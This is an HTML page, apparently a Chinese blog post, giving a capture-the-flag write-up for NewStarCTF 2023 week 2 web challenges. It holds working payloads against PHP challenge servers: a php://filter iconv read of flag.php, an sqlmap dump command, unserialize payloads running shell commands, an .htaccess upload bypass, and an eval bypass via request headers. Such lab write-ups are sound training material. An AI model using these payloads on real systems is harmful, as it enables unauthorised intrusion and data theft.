@@ -1,0 +1,678 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/url.jpg">
+  <link rel="icon" href="/img/url.jpg">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="J_0k3r">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="成人只寄望收获 情人只听见承诺 为何都不大懂得努力珍惜对方 -《Shall We Talk》陈奕迅">
+<meta property="og:type" content="article">
+<meta property="og:title" content="NewStarCTF 2023 week2 wp">
+<meta property="og:url" content="http://example.com/2023/10/16/NewStarCTF%202023%20week2/index.html">
+<meta property="og:site_name" content="J_0k3r">
+<meta property="og:description" content="成人只寄望收获 情人只听见承诺 为何都不大懂得努力珍惜对方 -《Shall We Talk》陈奕迅">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://example.com/img/wp41.jpg">
+<meta property="article:published_time" content="2023-10-16T06:27:32.000Z">
+<meta property="article:modified_time" content="2023-10-17T14:46:11.581Z">
+<meta property="article:author" content="J_0k3r">
+<meta property="article:tag" content="Write Up">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="http://example.com/img/wp41.jpg">
+  
+  
+  
+  <title>NewStarCTF 2023 week2 wp - J_0k3r</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"example.com","root":"/","version":"1.9.4","typing":{"enable":true,"typeSpeed":150,"cursorChar":"_","loop":true,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml"};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 5.4.2"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>J_0k3r的秘密基地</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/links/">
+                <i class="iconfont icon-link-fill"></i>
+                <span>友链</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/wp40.jpg') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="NewStarCTF 2023 week2 wp"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-author" aria-hidden="true"></i>
+        J_0k3r
+      </span>
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2023-10-16 14:27" pubdate>
+          2023年10月16日 下午
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          3.7k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          31 分钟
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">NewStarCTF 2023 week2 wp</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h1 id="web"><a href="#web" class="headerlink" title="web"></a>web</h1><h2 id="游戏高手"><a href="#游戏高手" class="headerlink" title="游戏高手"></a>游戏高手</h2><p>查看js源码可以看到以下片段</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs php">游戏高手<span class="hljs-comment">//游戏结束</span><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">gameover</span>(<span class="hljs-params"></span>)</span>&#123;<br>  <span class="hljs-keyword">if</span>(gameScore &gt; <span class="hljs-number">100000</span>)&#123;   <br>    <span class="hljs-keyword">var</span> xhr = <span class="hljs-keyword">new</span> <span class="hljs-title class_">XMLHttpRequest</span>();<br>    xhr.<span class="hljs-title function_ invoke__">open</span>(<span class="hljs-string">&quot;POST&quot;</span>, <span class="hljs-string">&quot;/api.php&quot;</span>, <span class="hljs-literal">true</span>);        <span class="hljs-comment">//向/api.php post发包</span><br>    xhr.<span class="hljs-title function_ invoke__">setRequestHeader</span>(<span class="hljs-string">&quot;Content-Type&quot;</span>, <span class="hljs-string">&quot;application/json&quot;</span>);  <span class="hljs-comment">//设置header</span><br>    xhr.onreadystatechange = <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) </span>&#123;<br>      <span class="hljs-keyword">if</span> (xhr.readyState === <span class="hljs-number">4</span> &amp;&amp; xhr.status === <span class="hljs-number">200</span>) &#123;<br>        <span class="hljs-keyword">var</span> response = JSON.<span class="hljs-title function_ invoke__">parse</span>(xhr.responseText);<br>        <span class="hljs-title function_ invoke__">alert</span>(response.message);<br>      &#125;<br>    &#125;;<br>    <span class="hljs-keyword">var</span> data = &#123;<br>      score: gameScore,          <br>      &#125;;<br>    xhr.<span class="hljs-title function_ invoke__">send</span>(JSON.<span class="hljs-title function_ invoke__">stringify</span>(data));  <span class="hljs-comment">//json格式发送score</span><br>  &#125;<br>  <span class="hljs-title function_ invoke__">alert</span>(<span class="hljs-string">&quot;成绩：&quot;</span>+gameScore);<br>  gameScore=<span class="hljs-number">0</span>;  <br>  curPhase =PHASE_READY;  <br>  hero = <span class="hljs-literal">null</span>;<br>  hero = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Hero</span>();  	    <br>&#125;<br></code></pre></td></tr></table></figure>
+<p><img src="/mdimg/newstarweek2/1.png" srcset="/img/loading.gif" lazyload><br><img src="/mdimg/newstarweek2/2.png" srcset="/img/loading.gif" lazyload></p>
+<h2 id="include-0。0"><a href="#include-0。0" class="headerlink" title="include 0。0"></a>include 0。0</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-comment">// FLAG in the flag.php</span><br><span class="hljs-variable">$file</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>];<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$file</span>) &amp;&amp; !<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/base|rot/i&#x27;</span>,<span class="hljs-variable">$file</span>))&#123;<br>    @<span class="hljs-keyword">include</span>(<span class="hljs-variable">$file</span>);<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;nope&quot;</span>);<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
+<p>显然是ban了filter协议的base和rot编码<br>然鹅filter不只支持base和rot编码<br><a target="_blank" rel="noopener" href="https://blog.csdn.net/gental_z/article/details/122303393">https://blog.csdn.net/gental_z/article/details/122303393</a><br><code>?file=php://filter/read=convert.iconv.utf-8.utf-16/resource=flag.php</code></p>
+<h2 id="ez-sql"><a href="#ez-sql" class="headerlink" title="ez_sql"></a>ez_sql</h2><p><code>sqlmap -r 1.txt --batch -D ctf -T here_is_flag -C flag --dump</code><br>1.txt 是 抓包</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php">GET /?id=TMP1589 HTTP/<span class="hljs-number">1.1</span><br>Host: e0f82dae-d70f-<span class="hljs-number">441</span>e-bb37-aec6423da5b0.node4.buuoj.cn:<span class="hljs-number">81</span><br>Upgrade-Insecure-Requests: <span class="hljs-number">1</span><br>User-Agent: Mozilla/<span class="hljs-number">5.0</span> (Windows NT <span class="hljs-number">10.0</span>; Win64; x64) AppleWebKit/<span class="hljs-number">537.36</span> (KHTML, like Gecko) Chrome/<span class="hljs-number">101.0</span>.<span class="hljs-number">4951.41</span> Safari/<span class="hljs-number">537.36</span><br>Accept: text/html,application/xhtml+xml,application/xml;q=<span class="hljs-number">0.9</span>,image/avif,image/webp,image/apng,*<span class="hljs-comment">/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="hljs-comment">Accept-Encoding: gzip, deflate</span><br><span class="hljs-comment">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="hljs-comment">Connection: close</span><br><span class="hljs-comment"></span><br></code></pre></td></tr></table></figure>
+<h2 id="Unserialize？"><a href="#Unserialize？" class="headerlink" title="Unserialize？"></a>Unserialize？</h2><p>反序列化 <code>private </code>变量序列化之后产生不可见字符 用<code>%00</code>替换<br><img src="/mdimg/newstarweek2/3.png" srcset="/img/loading.gif" lazyload><br><code>unser=O:4:&quot;evil&quot;:1:&#123;s:9:&quot;%00evil%00cmd&quot;;s:33:&quot;nl /th1s_1s_fffflllll4444aaaggggg&quot;;&#125;</code><br><img src="/mdimg/newstarweek2/4.png" srcset="/img/loading.gif" lazyload><br>也可以用</p>
+<ul>
+<li>od  -c：<code>unser=O:4:&quot;evil&quot;:1:&#123;s:9:&quot;%00evil%00cmd&quot;;s:36:&quot;od /th1s_1s_fffflllll4444aaaggggg&quot;;&#125;</code></li>
+<li>uniq ：<code>unser=O:4:&quot;evil&quot;:1:&#123;s:9:&quot;%00evil%00cmd&quot;;s:35:&quot;uniq /th1s_1s_fffflllll4444aaaggggg&quot;;&#125;</code></li>
+<li>head：<code>unser=O:4:&quot;evil&quot;:1:&#123;s:9:&quot;%00evil%00cmd&quot;;s:35:&quot;head /th1s_1s_fffflllll4444aaaggggg&quot;;&#125;</code></li>
+<li>sort：<code>unser=O:4:&quot;evil&quot;:1:&#123;s:9:&quot;%00evil%00cmd&quot;;s:35:&quot;sort /th1s_1s_fffflllll4444aaaggggg&quot;;&#125;</code></li>
+<li>file -f ：<code>unser=O:4:&quot;evil&quot;:1:&#123;s:9:&quot;%00evil%00cmd&quot;;s:38:&quot;file -f /th1s_1s_fffflllll4444aaaggggg&quot;;&#125;</code></li>
+</ul>
+<h2 id="Upload-again"><a href="#Upload-again" class="headerlink" title="Upload again!"></a>Upload again!</h2><p><code>.htaccess</code><br><img src="/mdimg/newstarweek2/5.png" srcset="/img/loading.gif" lazyload><br><code>script</code>标签绕过<br><img src="/mdimg/newstarweek2/6.png" srcset="/img/loading.gif" lazyload><br><img src="/mdimg/newstarweek2/7.png" srcset="/img/loading.gif" lazyload></p>
+<h2 id="R-C-E"><a href="#R-C-E" class="headerlink" title="R!!C!!E!!"></a>R!!C!!E!!</h2><p><code>dirsearch扫</code><br>buu 特性 要设置延时<br><code>dirsearch -u [http://2720598a-9ade-4894-aa95-bed7e562413c.node4.buuoj.cn:81/](http://2720598a-9ade-4894-aa95-bed7e562413c.node4.buuoj.cn:81/) --delay=5  </code><br><img src="/mdimg/newstarweek2/8.png" srcset="/img/loading.gif" lazyload><br>GitHack<br><code>python2 GitHack.py -u [http://2720598a-9ade-4894-aa95-bed7e562413c.node4.buuoj.cn:81/.git/](http://2720598a-9ade-4894-aa95-bed7e562413c.node4.buuoj.cn:81/.git/) </code><br>bo0g1pop.php</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-keyword">if</span> (<span class="hljs-string">&#x27;;&#x27;</span> === <span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-string">&#x27;/[^\W]+\((?R)?\)/&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;star&#x27;</span>])) &#123;<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/high|get_defined_vars|scandir|var_dump|read|file|php|curent|end/i&#x27;</span>,<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;star&#x27;</span>]))&#123;<br>        <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;star&#x27;</span>]);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+<p><code>[^\W]+\((?R)?\)</code><br><code>[^\W]</code>匹配所有字符<br><code>(?R)</code>表示递归<br>这个正则匹配类似<code>abc()</code>的字符 而<code>preg_replace</code>把匹配到的类似的字符置空<br><img src="/mdimg/newstarweek2/9.png" srcset="/img/loading.gif" lazyload><br><img src="/mdimg/newstarweek2/10.png" srcset="/img/loading.gif" lazyload><br><img src="/mdimg/newstarweek2/11.png" srcset="/img/loading.gif" lazyload><br>可以看出 大概逻辑就是括号里面不能有字符，如果有则必须是<code>xxx()</code>格式的<br><code>get_defined_vars scandir</code>ban了好多payload<br>思路就是找到一个可以传参数的地方然后再套一个eval来绕过<br><code>get_defined_vars()</code>返回是一个包含 GET、POST等的数组 这里被ban了，搜一下有没有类似函数<br>有两个<code>get_defined_functions()</code>和<code>get_defined_constants()</code> 分别返回已定义方法 、 常量<br><code>get_defined_functions()</code>里面有很多方法包括<code>scandir</code>和<code>get_defined_vars()</code><br>但是数组太大，不知道怎么选中其中一个键<br>后面想到，能传参数的不只有GET POST 还有 header<br>翻php文档发现<code>get_headers</code>可以取得服务器响应 HTTP 请求所发送的所有标头<br>但是这个函数需要一个参数<br>然后找到了<code>headers_list</code><br><img src="/mdimg/newstarweek2/12.png" srcset="/img/loading.gif" lazyload><br>语法错误…<br>再找找<br><code>apache_response_headers</code> 还是 只有content-type ………<br>然后找到了<code>getallheaders()</code><br><img src="/mdimg/newstarweek2/13.png" srcset="/img/loading.gif" lazyload><br>可以用ua头<br><img src="/mdimg/newstarweek2/14.png" srcset="/img/loading.gif" lazyload><br>发现xff和<code>X-Forwarded-Proto</code> 都改不了<br><img src="/mdimg/newstarweek2/15.png" srcset="/img/loading.gif" lazyload></p>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/CTF/" class="category-chain-item">CTF</a>
+  
+  
+    <span>></span>
+    
+  <a href="/categories/CTF/Write-Up/" class="category-chain-item">Write Up</a>
+  
+  
+
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/Write-Up/">#Write Up</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>NewStarCTF 2023 week2 wp</div>
+      <div>http://example.com/2023/10/16/NewStarCTF 2023 week2/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>J_0k3r</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2023年10月16日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              BY J_0K3R 
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2023/10/07/ctfshow-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8Cweb29-web77/" title="ctfshow-命令执行web29-web77 wp">
+                        <span class="hidden-mobile">ctfshow-命令执行web29-web77 wp</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       J_0k3r <i class="iconfont icon-love"></i> Hor1zon 
+    </div>
+  
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.0/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.18.2/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
